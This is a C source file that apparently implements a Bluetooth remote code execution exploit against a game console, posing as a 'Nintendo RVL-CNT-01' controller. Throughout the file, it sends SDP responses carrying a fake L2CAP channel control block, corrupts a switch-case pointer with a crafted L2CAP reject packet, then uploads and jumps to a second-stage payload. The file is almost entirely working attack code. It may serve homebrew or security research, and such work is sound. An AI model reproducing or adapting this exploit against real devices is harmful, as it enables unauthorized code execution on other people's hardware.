/*  Copyright 2019  Dexter Gerig  <dexgerig@gmail.com>
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <errno.h>
#include <unistd.h>
#include <stdint.h>
#include <endian.h>

#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#include "stream_macros.h"

uint32_t SDP_CB;
uint32_t L2CB;
uint32_t SWITCH_ADDR;

void* get_file(char *name, int *out_len) {
	FILE *f = fopen(name, "rb");
	if (f == NULL) {
		if (out_len)
			*out_len = 0;
		return NULL;
	}
	
	fseek(f, 0L, SEEK_END);
	size_t length = ftell(f);
	rewind(f);
	
	void *data = malloc(length);
	if (data == NULL) {
		fclose(f);
		if (out_len)
			*out_len = 0;
		return NULL;
	}
	
	fread(data, 1, length, f);
	fclose(f);
	
	if (out_len)
		*out_len = length;
	return data;
}

static inline void hci_filter_clear(struct hci_filter *f)
{
	memset(f, 0, sizeof(*f));
}
static inline void hci_filter_all_ptypes(struct hci_filter *f)
{
	memset((void *) &f->type_mask, 0xff, sizeof(f->type_mask));
}
static inline void hci_filter_all_events(struct hci_filter *f)
{
	memset((void *) f->event_mask, 0xff, sizeof(f->event_mask));
}

int hci_open_dev(int dev_id)
{
	struct sockaddr_hci a;
	int dd, err;

	/* Check for valid device id */
	if (dev_id < 0) {
		errno = ENODEV;
		return -1;
	}

	/* Create HCI socket */
	dd = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
	if (dd < 0)
		return dd;
	
	/* Set filters */
	struct hci_filter flt;
	hci_filter_clear(&flt);
	hci_filter_all_ptypes(&flt);
	hci_filter_all_events(&flt);
	if (setsockopt(dd, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) < 0) {
		printf("Can't set filter\n");
		goto failed;
	}

	/* Bind socket to the HCI device */
	memset(&a, 0, sizeof(a));
	a.hci_family = AF_BLUETOOTH;
	a.hci_dev = dev_id;
	if (bind(dd, (struct sockaddr *) &a, sizeof(a)) < 0) {
		printf("Can't bind to socket\n");
		goto failed;
	}

	return dd;

failed:
	err = errno;
	close(dd);
	errno = err;

	return -1;
}

int get_device_handle(int raw_sock) {
	uint8_t *buf = malloc(HCI_MAX_FRAME_SIZE);
	ssize_t ret = 0;
	
	// Only process 100 packets at max to prevent an infinite loop
	for (int i = 0; i < 100; i++) {
		do {
			ret = recv(raw_sock, buf, HCI_MAX_FRAME_SIZE, MSG_DONTWAIT);
		} while (ret == EINTR);
		
		if (ret == EAGAIN || ret == EWOULDBLOCK)
			continue;
		
		if (buf[0] != HCI_EVENT_PKT)
			continue;
		
		if (buf[1] != 0x03) // HCI_CONNECTION_COMPLETE_EVENT
			continue;
		
		int handle = (buf[5] * 0x100) | buf[4];
		free(buf);
		return handle;
	}
	
	free(buf);
	return -1;
}

int hci_send_cmd(int dd, uint16_t ogf, uint16_t ocf, void *param, uint8_t plen)
{
	uint8_t type = HCI_COMMAND_PKT;
	hci_command_hdr hc;
	struct iovec iv[3];
	int ivn;

	hc.opcode = htobs(cmd_opcode_pack(ogf, ocf));
	hc.plen = plen;

	iv[0].iov_base = &type;
	iv[0].iov_len  = 1;
	iv[1].iov_base = &hc;
	iv[1].iov_len  = HCI_COMMAND_HDR_SIZE;
	ivn = 2;

	if (plen) {
		iv[2].iov_base = param;
		iv[2].iov_len  = plen;
		ivn = 3;
	}

	while (writev(dd, iv, ivn) < 0) {
		if (errno == EAGAIN || errno == EINTR)
			continue;
		return -1;
	}
	return 0;
}

#define MTU 0x00F0 // Just to be on the safe side

int hci_send_acl(int dd, uint16_t handle, uint8_t pb_bc, void *param, uint16_t dlen)
{
	if (dlen > MTU) {
		printf("hci_send_acl: dlen bigger than MTU\n");
		return -1;
	}
	
	uint8_t type = HCI_ACLDATA_PKT;
	hci_acl_hdr ha;
	struct iovec iv[3];
	int ivn;

	ha.handle = htobs(acl_handle_pack(handle, pb_bc));
	ha.dlen = htobs(dlen);

	iv[0].iov_base = &type;
	iv[0].iov_len  = 1;
	iv[1].iov_base = &ha;
	iv[1].iov_len  = HCI_ACL_HDR_SIZE;
	ivn = 2;

	if (dlen) {
		iv[2].iov_base = param;
		iv[2].iov_len  = dlen;
		ivn = 3;
	}

	while (writev(dd, iv, ivn) < 0) {
		if (errno == EAGAIN || errno == EINTR)
			continue;
		return -1;
	}
	return 0;
}

// Use this, it fragments the packet for you.
// TODO: Actually test this first
int send_acl_packet(int dd, uint16_t handle, void* param, int len) {
	int ret = 0;
	
	if (dd < 0) {
		printf("send_acl_packet: Invalid socket\n");
		return -1;
	}
	
	if (param == NULL || len == 0) {
		printf("send_acl_packet: No data to send\n");
		return -1;
	}
	
	if (len < 0 || len > 0xFFFF) {
		printf("send_acl_packet: Invalid length\n");
		return -1;
	}
	
	if (len <= MTU) {
		return hci_send_acl(dd, handle, ACL_START, param, len);
	}
	
	ret = hci_send_acl(dd, handle, ACL_START, param, MTU);
	if (ret)
		return ret;
	
	int rem = len - MTU;
	while (rem > MTU) {
		int ret = hci_send_acl(dd, handle, ACL_CONT, param, MTU);
		if (ret)
			return ret;
		rem -= MTU;
	}
	
	if (rem)
		ret = hci_send_acl(dd, handle, ACL_CONT, param, rem);
	
	return ret;
}

struct l2cap_payload {
	uint8_t opcode;
	uint8_t id;
	uint16_t length;
	uint8_t data[];
} __attribute__ ((packed));
#define L2CAP_PAYLOAD_LENGTH 4

struct l2cap_packet {
	uint16_t length;
	uint16_t cid;
	struct l2cap_payload payload;
} __attribute__ ((packed));
#define L2CAP_HEADER_LENGTH 4
#define L2CAP_OVERHEAD 8

int await_response(int raw_sock, uint16_t await_msg) {
	uint8_t *buf = malloc(HCI_MAX_FRAME_SIZE);
	ssize_t ret = 0;
	
	while (1) {
		do {
			ret = recv(raw_sock, buf, HCI_MAX_FRAME_SIZE, 0);
		} while (ret == EINTR || ret == EAGAIN);
		
		if (ret < 0) {
			printf("recv failed: %ld\n", ret);
			free(buf);
			return -1;
		}
		
		if (buf[0] != HCI_ACLDATA_PKT)
			continue;
		
		hci_acl_hdr *hdr = (hci_acl_hdr*)&buf[1];
		int size_left = btohs(hdr->dlen);
		uint8_t *l2_head = &buf[1 + sizeof(hci_acl_hdr)];
		while (size_left > 0) {
			struct l2cap_packet *pkt = (struct l2cap_packet*)l2_head;
			int pkt_len = L2CAP_HEADER_LENGTH + le16toh(pkt->length);
			size_left -= pkt_len;
			l2_head += pkt_len;
			
			uint8_t *payload_head = (uint8_t*)&pkt->payload;
			while (pkt_len > 0) {
				struct l2cap_payload *payload = (struct l2cap_payload*)payload_head;
				int payload_len = L2CAP_PAYLOAD_LENGTH + le16toh(payload->length);
				pkt_len -= payload_len;
				payload_head += payload_len;
				
				if (payload->opcode != 0x03) // L2CAP_CONNECTION_RESPONSE
					continue;
				
				uint8_t *conn_response = payload->data;
				uint16_t dest_cid;
				uint16_t src_cid;
				uint16_t result;
				uint16_t status;
				
				STREAM_TO_UINT16(dest_cid, conn_response);
				STREAM_TO_UINT16(src_cid, conn_response);
				STREAM_TO_UINT16(result, conn_response);
				STREAM_TO_UINT16(status, conn_response);
				
				// shutup gcc
				(void)dest_cid;
				(void)src_cid;
				(void)result;
				(void)status;
				
				if (result != await_msg)
					continue;
				
				free(buf);
				return 0;
			}
		}
	}
}

void do_hax(int raw_sock, int device_handle) {
	// Chain these packets together so things are more deterministic.
	int bad_packet_len = L2CAP_PAYLOAD_LENGTH + 6;
	int empty_packet_len = L2CAP_PAYLOAD_LENGTH;
	int total_length = L2CAP_HEADER_LENGTH + bad_packet_len + empty_packet_len;
	struct l2cap_packet *hax = malloc(total_length);
	struct l2cap_payload *p = &hax->payload;
	
	hax->length = htole16(bad_packet_len + empty_packet_len);
	hax->cid = htole16(0x0001);
	
	printf("Overwriting switch case 0xb in process_l2cap_cmd.\n");
	
	p->opcode = 0x01; // L2CAP_CMD_REJECT
	p->id = 0x00;
	p->length = htole16(0x0006);
	uint8_t *d = &p->data[0];
	
	UINT16_TO_STREAM(d, 0x0002); // L2CAP_CMD_REJ_INVALID_CID
	UINT16_TO_STREAM(d, 0x0000); // rcid (from faked ccb)
	UINT16_TO_STREAM(d, 0x0040 + 0x1f); // lcid
	
	p = (struct l2cap_payload*)((uint8_t*)p + L2CAP_PAYLOAD_LENGTH + le16toh(p->length));
	
	printf("Trigger switch statement 0xb.\n");
	
	p->opcode = 0x0b; // L2CAP_CMD_INFO_RSP which is now a jump to our payload
	p->id = 0x00;
	p->length = htole16(0x0000);
	
	p = (struct l2cap_payload*)((uint8_t*)p + L2CAP_PAYLOAD_LENGTH + le16toh(p->length));
	
	printf("Sending hax\n");
	hci_send_acl(raw_sock, device_handle, ACL_START, hax, total_length);
	free(hax);
	
	printf("Awaiting response from stage0\n");
	int ret = await_response(raw_sock, 0x5330); // 'S0'
	if (ret < 0) {
		printf("Didn't find response from stage0\n");
		return;
	}
	printf("Got response!\n");
}

struct ccb {
	uint8_t in_use;
	uint32_t chnl_state;
	uint32_t p_next_ccb;
	uint32_t p_prev_ccb;
	uint32_t p_lcb;
	uint16_t local_cid;
	uint16_t remote_cid;
	// We only go up to the fields we care about, you should still leave the rest blank as there are some fields that should be just left zero after it like the timer object.
};

// TODO: Figure out the real MTU instead of choosing semi-random numbers
#define SDP_MTU 0xD0

void send_sdp_service_response(int fd) {
	uint16_t required_size = 1 + 2 + 2 + 2 + 2 + (0x15 * 4) + 1;
	
	uint8_t *response = malloc(required_size);
	memset(response, 0x00, required_size);
	uint8_t *p = response;
	
	struct ccb fake_ccb;
	memset(&fake_ccb, 0x00, sizeof(struct ccb));
	fake_ccb.in_use = 1;
	fake_ccb.chnl_state = htobe32(0x00000002); // CST_TERM_W4_SEC_COMP
	fake_ccb.p_next_ccb = htobe32(SDP_CB + 0x68);
	fake_ccb.p_prev_ccb = htobe32(SWITCH_ADDR - 8);
	fake_ccb.p_lcb = htobe32(L2CB + 0x8);
	fake_ccb.local_cid = htobe16(0x0000);
	fake_ccb.remote_cid = htobe16(0x0000); // Needs to match the rcid sent in the packet that uses the faked ccb.
	
	UINT8_TO_BE_STREAM(p, 0x03); // SDP_ServiceSearchResponse
	UINT16_TO_BE_STREAM(p, 0x0001); // Transaction ID (ignored, no need to keep track of)
	UINT16_TO_BE_STREAM(p, 0x0059); // ParameterLength
	UINT16_TO_BE_STREAM(p, 0x0015); // TotalServiceRecordCount
	UINT16_TO_BE_STREAM(p, 0x0015); // CurrentServiceRecordCount
	memcpy(p + (0xa * 4), &fake_ccb, sizeof(struct ccb)); p += (0x15 * 4); // Embed payload in ServiceRecordHandleList
	UINT8_TO_BE_STREAM(p, 0x00); // ContinuationState
	
	send(fd, response, p - response, 0);
	
	uint8_t *reply = malloc(0x200);
	recv(fd, reply, 0x200, 0); // TODO: Check the reply for errors so we can catch things going wrong earlier.
	free(reply);
	free(response);
	
	return;
}

void send_sdp_attribute_response(int fd, void* payload, int len) {
	
	uint16_t required_size = 1 + 2 + 2 + 2 + 1 + 1 + 1 + 2 + 1 + SDP_MTU + 1;
	
	uint8_t *response = malloc(required_size);
	memset(response, 0x00, required_size);
	uint8_t *p = response;
	
	UINT8_TO_BE_STREAM(p, 0x05); // SDP_ServiceAttributeResponse
	UINT16_TO_BE_STREAM(p, 0x0001); // Transaction ID (ignored, no need to keep track of)
	UINT16_TO_BE_STREAM(p, 2 + 1 + 1 + 1 + 2 + 1 + SDP_MTU + 1); // ParameterLength
	UINT16_TO_BE_STREAM(p, 1 + 1 + 1 + 2 + 1 + SDP_MTU); // AttributeListByteCount
	UINT8_TO_BE_STREAM(p, 0x35); // DATA_ELE_SEQ_DESC_TYPE and SIZE_1
	UINT8_TO_BE_STREAM(p, 0x02); // size of data elements
	UINT8_TO_BE_STREAM(p, 0x09); // UINT_DESC_TYPE and SIZE_2
	UINT16_TO_BE_STREAM(p, 0xbeef); // The dummy int
	UINT8_TO_BE_STREAM(p, 0x00); // padding so instruction is 0x4 aligned
	memcpy(p, payload, len > SDP_MTU ? SDP_MTU : len); p += (len > SDP_MTU ? SDP_MTU : len); // payload
	UINT8_TO_BE_STREAM(p, len <= SDP_MTU ? 0x00 : 0x01); // ContinuationState
	
	send(fd, response, p - response, 0);
	
	uint8_t *reply = malloc(0x200);
	recv(fd, reply, 0x200, 0); // TODO: Same
	
	int rem = len - SDP_MTU;
	while (rem > 0) {
		memset(response, 0x00, required_size);
		p = response;
		
		// We don't have to care about giving a valid attribute sequence this time so just stick the payload right in.
		UINT8_TO_BE_STREAM(p, 0x05); // SDP_ServiceAttributeResponse
		UINT16_TO_BE_STREAM(p, 0x0001); // Transaction ID (ignored, no need to keep track of)
		UINT16_TO_BE_STREAM(p, 2 + SDP_MTU + 1); // ParameterLength
		UINT16_TO_BE_STREAM(p, SDP_MTU); // AttributeListByteCount
		memcpy(p, payload + len - rem, rem > SDP_MTU ? SDP_MTU : rem); p += (rem > SDP_MTU ? SDP_MTU : rem); // payload
		UINT8_TO_BE_STREAM(p, rem <= SDP_MTU ? 0x00 : 0x01); // ContinuationState
		
		send(fd, response, p - response, 0);
		
		recv(fd, reply, 0x200, 0); // TODO: Same
		rem -= SDP_MTU;
	}
	
	free(reply);
	free(response);
	return;
}

#define PAYLOAD_MTU 0xD0

void upload_payload(int fd, int device_handle, void* data, uint32_t size) {
	int segments = size / PAYLOAD_MTU;
	int ret = 0;
	
	printf("0 / %d", size);
	fflush(stdout);
	for (int i = 0; i < segments; i++) {
		int upload_packet_len = L2CAP_PAYLOAD_LENGTH + PAYLOAD_MTU;
		int total_length = L2CAP_HEADER_LENGTH + upload_packet_len;
		struct l2cap_packet *upload = malloc(total_length);
		struct l2cap_payload *p = &upload->payload;
		
		upload->length = htole16(upload_packet_len);
		upload->cid = htole16(0x0001);
		
		p->opcode = 0x0B; // L2CAP_CMD_UPLOAD_PAYLOAD
		p->id = 0x00; // CONTINUE_REQUEST
		p->length = htole16(PAYLOAD_MTU);
		
		memcpy(&p->data[0], data + (i * PAYLOAD_MTU), PAYLOAD_MTU);
		
		printf("\r%d / %d", i * PAYLOAD_MTU, size);
		fflush(stdout);
		hci_send_acl(fd, device_handle, ACL_START, upload, total_length);
		free(upload);
		ret = await_response(fd, 0x4744);
		if (ret < 0) {
			printf("\nDidn't find response from stage0\n");
			return;
		}
	}
	
	if ((size % PAYLOAD_MTU) != 0) {
		int remainder = size % PAYLOAD_MTU;
		int upload_packet_len = L2CAP_PAYLOAD_LENGTH + remainder;
		int total_length = L2CAP_HEADER_LENGTH + upload_packet_len;
		struct l2cap_packet *upload = malloc(total_length);
		struct l2cap_payload *p = &upload->payload;
		
		upload->length = htole16(upload_packet_len);
		upload->cid = htole16(0x0001);
		
		p->opcode = 0x0B; // L2CAP_CMD_UPLOAD_PAYLOAD
		p->id = 0x00; // CONTINUE_REQUEST
		p->length = htole16(remainder);
		
		memcpy(&p->data[0], data + size - remainder, remainder);
		
		printf("\r%d / %d", size, size);
		fflush(stdout);
		hci_send_acl(fd, device_handle, ACL_START, upload, total_length);
		free(upload);
		ret = await_response(fd, 0x4744);
		if (ret < 0) {
			printf("\nDidn't find response from stage0\n");
			return;
		}
	}
	printf("\n");
}

void jump_payload(int fd, int device_handle) {
	int jump_packet_len = L2CAP_PAYLOAD_LENGTH;
	int total_length = L2CAP_HEADER_LENGTH + jump_packet_len;
	struct l2cap_packet *jump = malloc(total_length);
	struct l2cap_payload *p = &jump->payload;
	
	jump->length = htole16(jump_packet_len);
	jump->cid = htole16(0x0001);
	
	p->opcode = 0x0B; // L2CAP_CMD_UPLOAD_PAYLOAD
	p->id = 0x01; // JUMP_PAYLOAD
	p->length = htole16(0x0000);
	
	hci_send_acl(fd, device_handle, ACL_START, jump, total_length);
	free(jump);
}

int set_device_local_name(int fd, char *name) {
	int name_len = strlen(name) + 1;
	
	if (name_len > 248) {
		printf("Device name too long\n");
		return -1;
	}
	
	char padded_local_name[248] = {0};
	memcpy(padded_local_name, name, name_len);
	
	hci_send_cmd(fd, 0x0003, 0x0013, padded_local_name, 248); // HCI_Write_Local_Name
	
	return 0;
}

int main(int argc, char *argv[]) {
	(void)argc; // Shutup gcc
	(void)argv;
	int l2cap_sock = -1;
	int con = -1;
	int raw_sock = -1;
	struct sockaddr_l2 l2addr;
	char *stage0_name = NULL;
	int stage0_length = 0;
	void* stage0 = NULL;
	char *stage1_name = NULL;
	int stage1_length = 0;
	void* stage1 = NULL;
	
	int hci_device = 0;
	if (argc == 4) {
		hci_device = (int)strtol(argv[1], NULL, 16);
		stage0_name = argv[2];
		stage1_name = argv[3];
	} else {
		stage0_name = argv[1];
		stage1_name = argv[2];
	}
	
	stage0 = get_file(stage0_name, &stage0_length);
	if (stage0 == NULL) {
		printf("Failed to open stage0: %s\n", stage0_name);
		goto err_out;
	}
	
	SDP_CB = be32toh(*((uint32_t*)stage0 + 0));
	L2CB = be32toh(*((uint32_t*)stage0 + 1));
	SWITCH_ADDR = be32toh(*((uint32_t*)stage0 + 2));
	
	printf("App settings:\n");
	printf("\tSDP_CB: 0x%08X\n", SDP_CB);
	printf("\tL2CB: 0x%08X\n", L2CB);
	printf("\tSWITCH_ADDR: 0x%08X\n", SWITCH_ADDR);
	
	printf("Opening device hci%d\n", hci_device);
	raw_sock = hci_open_dev(hci_device);
	if (raw_sock < 0) {
		printf("Failed to open device\n");
		goto err_out;
	}
	
	printf("Setting device local name\n");
	if (set_device_local_name(raw_sock, "Nintendo RVL-CNT-01") < 0) {
		printf("Failed to set device local name\n");
		goto err_out;
	}
	
	l2cap_sock = socket(PF_BLUETOOTH, SOCK_STREAM, BTPROTO_L2CAP);
	if (l2cap_sock < 0) {
		printf("Error opening l2cap socket: %s\n", strerror(errno));
		goto err_out;
	}
	
	memset(&l2addr, 0, sizeof(l2addr));
	l2addr.l2_family = AF_BLUETOOTH;
	bacpy(&l2addr.l2_bdaddr, BDADDR_ANY);
	l2addr.l2_psm = htobs(0x0001); // SDP_PSM
	
	if (bind(l2cap_sock, (struct sockaddr *) &l2addr, sizeof(l2addr)) < 0) {
		printf("Error binding to l2cap socket: %s\n", strerror(errno));
		goto err_out;
	}
	
	if (listen(l2cap_sock, 5) < 0) {
		printf("Error listening to l2cap socket: %s", strerror(errno));
		goto err_out;
	}
	
	struct sockaddr_l2 addr;
	socklen_t len = sizeof(addr);
	
	printf("Waiting to accept\n");
	con = accept(l2cap_sock, (struct sockaddr *) &addr, &len);
	if (con < 0) {
		printf("Error accepting connection: %s\n", strerror(errno));
		goto err_out;
	}
	
	// handle should now be waiting for us
	int device_handle = get_device_handle(raw_sock);
	printf("Got connection handle: %d\n", device_handle);
	if (device_handle < 0) {
		printf("Failed to find HCI connection handle\n");
		goto err_out;
	}
	
	printf("Sending SDP service response\n");
	send_sdp_service_response(con);
	
	printf("Sending SDP attribute response\n");
	send_sdp_attribute_response(con, stage0 + 0xc, stage0_length - 0xc);
	
	printf("Sleeping for 5 seconds to try to make sure stage0 is flushed\n");
	sleep(5);
	
	printf("Doing hax\n");
	do_hax(raw_sock, device_handle);
	
	stage1 = get_file(stage1_name, &stage1_length);
	if (stage1 == NULL) {
		printf("Failed to open stage1: %s\n", stage1_name);
		goto err_out;
	}
	
	printf("Uploading payload...\n");
	upload_payload(raw_sock, device_handle, stage1, stage1_length);
	printf("Jumping to payload!\n");
	jump_payload(raw_sock, device_handle);
	
err_out:
	free(stage0);
	free(stage1);
	if (l2cap_sock >= 0)
		close(l2cap_sock);
	if (con >= 0)
		close(con);
	if (raw_sock >= 0)
		close(raw_sock);
	
	return 0;
}
